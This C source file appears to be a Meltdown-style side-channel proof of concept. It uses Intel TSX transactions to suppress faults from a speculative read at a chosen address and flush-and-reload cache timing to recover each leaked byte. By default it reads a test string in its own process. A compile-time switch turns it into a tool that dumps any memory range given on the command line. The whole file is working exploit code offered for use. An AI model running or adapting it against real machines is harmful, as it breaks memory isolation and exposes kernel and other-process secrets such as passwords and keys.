// flush_reload from https://github.com/defuse/flush-reload-attacks
// TSX from https://github.com/andikleen/tsx-tools
// dump_hex from https://gist.github.com/ccbrown/9722406

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#include <sys/mman.h>

#define NUM_PROBES 5
#define TEST_IN_OWN_PROCESS 1
#define TEST_PHRASE "Hmm, this does really work!"

// TSX support

#ifndef _RTM_H
#define _RTM_H 1

/*
 * Copyright (c) 2012,2013 Intel Corporation
 * Author: Andi Kleen
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that: (1) source code distributions
 * retain the above copyright notice and this paragraph in its entirety, (2)
 * distributions including binary code include the above copyright notice and
 * this paragraph in its entirety in the documentation or other materials
 * provided with the distribution
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR IMPLIED
 * WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

/* Official RTM intrinsics interface matching gcc/icc, but works
   on older gcc compatible compilers and binutils. */

#define _XBEGIN_STARTED		(~0u)
#define _XABORT_EXPLICIT	(1 << 0)
#define _XABORT_RETRY		(1 << 1)
#define _XABORT_CONFLICT	(1 << 2)
#define _XABORT_CAPACITY	(1 << 3)
#define _XABORT_DEBUG		(1 << 4)
#define _XABORT_NESTED		(1 << 5)
#define _XABORT_CODE(x)		(((x) >> 24) & 0xff)

#define __rtm_force_inline __attribute__((__always_inline__)) inline

static __rtm_force_inline int _xbegin(void)
{
	int ret = _XBEGIN_STARTED;
	asm volatile(".byte 0xc7,0xf8 ; .long 0" : "+a" (ret) :: "memory");
	return ret;
}

static __rtm_force_inline void _xend(void)
{
	 asm volatile(".byte 0x0f,0x01,0xd5" ::: "memory");
}

/* This is a macro because some compilers do not propagate the constant
 * through an inline with optimization disabled.
 */
#define _xabort(status) \
	asm volatile(".byte 0xc6,0xf8,%P0" :: "i" (status) : "memory")

static __rtm_force_inline int _xtest(void)
{
	unsigned char out;
	asm volatile(".byte 0x0f,0x01,0xd6 ; setnz %0" : "=r" (out) :: "memory");
	return out;
}

#endif

__attribute__((always_inline))
inline void flush(const char *adrs)
{
  asm __volatile__ (
     "mfence         \n"
     "clflush 0(%0)  \n"
     :
     : "r" (adrs)
     :
  );
}

__attribute__((always_inline))
inline unsigned long probe(const char *adrs)
{
  volatile unsigned long time;

  asm __volatile__ (
    "mfence             \n"
    "lfence             \n"
    "rdtsc              \n"
    "lfence             \n"
    "movl %%eax, %%esi  \n"
    "movl (%1), %%eax   \n"
    "lfence             \n"
    "rdtsc              \n"
    "subl %%esi, %%eax  \n"
    "clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");

  return time;
}

unsigned char probe_one(size_t ptr, char* buf, int page_size)
{
   const int num_probes = NUM_PROBES;
   int c, i, status = 0, min_idx = 0, win_idx = 0;
   unsigned long times[256];
   unsigned char guessed_char = 0, tests[256];
   unsigned long long t1 = 0;
   volatile uint64_t val;
   
   memset(tests, 0, 256);
   
   for (c = 0; c < num_probes; c++) {
      memset(times, 0, sizeof(unsigned long) * 256);
      
      for (i=0; i<256; i++) {
         flush(&buf[i * page_size]);
      }
   
      if ((status = _xbegin()) == _XBEGIN_STARTED) {
         asm __volatile__ (
           "%=:                              \n"
           "xorq %%rax, %%rax                \n"
           "movb (%[ptr]), %%al              \n"
           "shlq $0xc, %%rax                 \n"
           "jz %=b                           \n"
           "movq (%[buf], %%rax, 1), %%rbx   \n"
           : 
           :  [ptr] "r" (ptr), [buf] "r" (buf)
           :  "%rax", "%rbx");
      
         _xend();
      } else {
         asm __volatile__ ("mfence\n" :::);
      }

      for (i=0; i<256; i++) {
         times[i] = probe(&buf[i * page_size]);
      }
   
      for (i=0; i<256; i++) {
         min_idx = (times[min_idx] > times[i]) ? i : min_idx;
      }
      
      tests[min_idx]++;
   }
   
   for (i=0; i<256; i++) {
      win_idx = (tests[i] > tests[win_idx]) ? i : win_idx;
   }
   
   return (unsigned char)win_idx;
}

void dump_hex(void* addr, const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
   printf("0x%016lx | ", (unsigned long)addr);
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

int main(int argc, char** argv)
{
   unsigned char read_buf[16];
   int page_size = getpagesize(), raw_output = 0;
   unsigned long start_addr = 0;
   unsigned long t, len = 0;

#if TEST_IN_OWN_PROCESS
   static char* test = TEST_PHRASE;
   
   start_addr = (unsigned long)test;
   len = strlen(test);
#else
   if (argc < 3 || argc > 4) {
      printf("usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n",
         argv[0]);
      return 0;
   }
   
   start_addr = strtoul(argv[1], NULL, 16);
   len = strtoul(argv[2], NULL, 10);
   
   if (argc == 4) {
      raw_output = 1;
   }
#endif
   
   char* poke = (char*)mmap(
      NULL,
      256 * page_size,
      PROT_READ | PROT_WRITE,
      MAP_ANON | MAP_SHARED,
      -1,
      0
   );
      
   if (MAP_FAILED == poke) {
      printf("mmap() failed: %s\n", strerror(errno));
      return -1;
   }
      
   printf ("poke buffer: %p, page size: %i\n", poke, page_size);
   
   for (t=0; t<len; t++) {
      if (!raw_output && t > 0 && 0 == t%16) {
         dump_hex((void*)(start_addr + t - 16), read_buf, 16);
      }
      
      read_buf[t%16] = probe_one(start_addr + t, poke, page_size);
      
      if (raw_output) {
         write(STDOUT_FILENO, &read_buf[t%16], 1);
      }
   }
   
   if (!raw_output && t > 0) {
      dump_hex((void*)(start_addr + ((t%16 ? t : (t-1))/16) * 16),
         read_buf, t%16 ? t%16 : 16);
   }
      
   munmap((void*)poke, 256 * page_size);
}
